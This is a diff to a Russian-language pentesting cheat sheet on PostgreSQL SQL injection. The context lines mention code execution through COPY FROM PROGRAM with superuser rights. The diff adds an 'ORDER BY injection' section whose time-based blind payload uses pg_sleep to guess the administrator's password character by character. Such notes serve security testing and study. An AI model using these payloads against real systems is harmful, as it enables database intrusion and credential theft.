@@ -6,7 +6,7 @@
 SELECT $test$quer$test$
 ```
 
-Code Execution
+### Code Execution
 
 Если есть права суперпользователя в базе, то можно исполнять код с помощью функций СУБД: `COPY TO` и `FROM PROGRAM`.
 
@@ -48,4 +48,14 @@ ORDER BY "usename",
         ELSE '' 
       END
   )::text;
+```
+
+### ORDER BY injection
+
+URL: [https://example.com/filtered\_search?SearchTerm=test\&sort-by=AUTHOR\&writer=](https://example.com/filtered\_search?SearchTerm=test\&sort-by=AUTHOR\&writer=)
+
+Payload для sort-by:
+
+```
+AUTHOR, (CASE WHEN (SELECT '1'='1' FROM users WHERE username = 'administrator' AND password LIKE 'j%') THEN pg_sleep(10)::text ELSE AUTHOR END)
 ```
